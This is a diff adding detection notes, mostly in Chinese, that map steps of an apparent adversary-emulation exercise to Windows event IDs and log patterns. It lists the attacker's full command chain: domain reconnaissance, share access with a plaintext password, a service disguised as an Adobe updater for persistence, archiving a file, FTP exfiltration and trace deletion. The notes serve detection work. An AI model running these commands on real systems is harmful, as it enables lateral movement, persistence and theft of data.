@@ -1,0 +1,98 @@
+1. 
+15.B.1      get-content \\HFDC01\IT\it_tasks.txt
+Pipeline execution details for command line: Get-Content FileSystem::\\\\HFDC01\\IT\\it_tasks.txt
+event_id为800,  且 param1为 Get-Content FileSystem::\\\\HFDC01\\IT\\it_tasks.txt
+                或者 param3 包含 ParameterBinding(Get-Content): name=\"Path\"; value=\"FileSystem::\\\\HFDC01\\IT\\it_tasks.txt\"
+event_id为4103, 且 paylaod包含 ParameterBinding(Get-Content): name=\"Path\"; value=\"FileSystem::\\\\HFDC01\\IT\\it_tasks.txt\"
+
+16.E.1      upload /tmp/autoupdate.vbs
+event_id为4103, 且payload包含 ParameterBinding(Set-Content): name=\"Path\"; value=\"autoupdate.vbs\"
+event_id为800, 且param3包含 ParameterBinding(Set-Content): name=\"Path\"; value=\"autoupdate.vbs\"
+event_id为11: TargetFilename包含autoupdate.vbs
+
+
+19.A.       upload recycler.exe
+event_id为4103, 且payload包含 ParameterBinding(Set-Content): name=\"Path\"; value=\"recycler.exe
+event_id为800, 且param3包含 ParameterBinding(Set-Content): name=\"Path\"; value=\"recycler.exe\"
+event_id为11: TargetFilename包含recycler.exe
+
+19.C.1      upload /tmp/ftp.txt
+event_id为4103, 且payload包含 ParameterBinding(Set-Content): name=\"Path\"; value=\"ftp.txt
+event_id为800, 且param3包含 ParameterBinding(Set-Content): name=\"Path\"; value=\"ftp.txt\"
+event_id为11: TargetFilename包含ftp.txt
+
+            shell c:\windows\system32\ftp.exe -v -s:ftp.txt
+name=\"Command\"; value=\"C:\\Windows\\System32\\ftp.exe -v -s:ftp.txt
+
+19.D.1      del c:\$Recycle.Bin\old.7z
+del C:\\\"$\"Recycle.bin\\old.7z
+event_id为800, 且param3包含 ParameterBinding(Invoke-Expression): name=\"Command\"; value=\"del C:\\\"$\"Recycle.bin\\old.7z\"
+event_id为4103,且payload包含 ParameterBinding(Invoke-Expression): name=\"Command\"; value=\"del C:\\\"$\"Recycle.bin\\old.7z\"
+
+19.D.2      del c:\windows\recycler.exe
+del recycler.exe
+event_id为800, 且param3包含 ParameterBinding(Invoke-Expression): name=\"Command\"; value=\"del recycler.exe\"
+event_id为4103,且payload包含 ParameterBinding(Invoke-Expression): name=\"Command\"; value=\"del recycler.exe\"
+
+
+20.A.1      RDP Connection to DC and pressin f5
+event_id为261 message包含: Listener RDP-Tcp received a connection
+
+20.B.1      whoami /all
+event_id为1, Description: whoami - displays logged on user information
+event_id为7, Description: whoami - displays logged on user information
+
+
+关键字:
+对于一般的Shell命令， ParameterBinding(Invoke-Expression): name=\"Command\"; value=
+                    如果使用PowerShell命令作为Shell命令，也会有记录这样的日志，例如：
+                        1）ParameterBinding(Invoke-Expression): name=\"Command\"; value=\"Get-Content FileSystem::\\\\HFDC01\\IT\\it_tasks.txt\"
+                        2）event_id=800, ParameterBinding(Get-Content): name=\"Path\"; value=\"FileSystem::\\\\HFDC01\\IT\\it_tasks.txt\"
+                        3) event_id=4103, ParameterBinding(Get-Content): name=\"Path\"; value=\"FileSystem::\\\\HFDC01\\IT\\it_tasks.txt\"
+
+
+对于PowerShell命令， ParameterBinding(Set-Content): name=\"Path\"; value=
+                    ParameterBinding(Get-Content): name=\"Path\"; value=
+                    ParameterBinding(Copy-Item): name=\"Path\"; value=
+                    ParameterBinding(Get-ChildItem): name="Path"; value="FileSystem::\\HFDC01\IT\"
+
+
+
+2. name=\"Command\"; value=
+(1) route print
+(2) ipconfig /all
+(3) whoami /all /fo list
+(4) qprocess *
+(5) net start
+(6) net group \"Domain Admins\" /domain
+(7) net localgroup \"Administrators\"
+(8) net user
+(9) net user /domain
+(10) net group \"Domain Computers\" /domain
+(11) net use
+(12) netstat -ano
+(13) reg query HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v EnableLUA
+(14) Get-Content FileSystem::\\\\HFDC01\\IT\\it_tasks.txt
+(15) net use `\\`\\HFDC01\\ADMIN$ /user:shire\\pgustavo W1n1!19
+(16) net use /delete `\\`\\HFDC01\\ADMIN$
+(17) net use `\\`\\HFDC01\\C$ /user:shire\\pgustavo W1n1!19
+(18) move-item c:\\windows\\system32\\autoupdate.vbs FileSystem::\"\\\\HFDC01\\C$\\Users\\pgustavo\\AppData\\Roaming\\Adobe\\Flash Player\\autoupdate.vbs
+(19) dir .
+(20) COPY c:\\Windows\\System32\\autoupdate.vbs \"`\\`\\HFDC01\\C$\\Users\\pgustavo\\AppData\\Roaming\\Adobe\\Flash Player\\autoupdate.vbs
+         "@timestamp" : "2019-05-14T23:11:17.980Z"
+(21) sc.exe `\\`\\HFDC01 query
+(22) C:\\WINDOWS\\system32\\sc.exe `\\`\\HFDC01 create AdobeUpdater binPath= \"cmd.exe /c `\\`\"C:\\Users\\pgustavo\\AppData\\Roaming\\Adobe\\Flash Player\\autoupdate.vbs`\\`\" \" DisplayName= \"Adobe Flash Updater\" start= auto
+(23) sc.exe `\\`\\HFDC01 qc AdobeUpdater
+(24) type FileSystem::\"\\\\HFDC01\\C$\\Users\\pgustavo\\AppData\\Roaming\\Adobe\\Flash Player\\autoupdate.vbs
+(25) sc.exe `\\`\\HFDC01 start AdobeUpdater
+(26) Get-Childitem -Path FileSystem::\\\\HFDC01\\IT\\
+(27) Copy-Item FileSystem::\\\\HFDC01\\IT\\recipe.txt C:\\\"$\"Recycle.Bin\\recipe.txt
+(28) recycler.exe a -t7z C:\\\"$\"Recycle.Bin\\old.7z C:\\\"$\"Recycle.Bin\\recipe.txt
+(29) C:\\Windows\\System32\\ftp.exe -v -s:ftp.txt
+(30) del C:\\\"$\"Recycle.bin\\old.7z
+(31) del recycler.exe
+
+3. ParameterBinding(Set-Content): name=\"Path\"; value=
+(1) autoupdate.vbs
+(2) recycler.exe 
+(3) ftp.txt
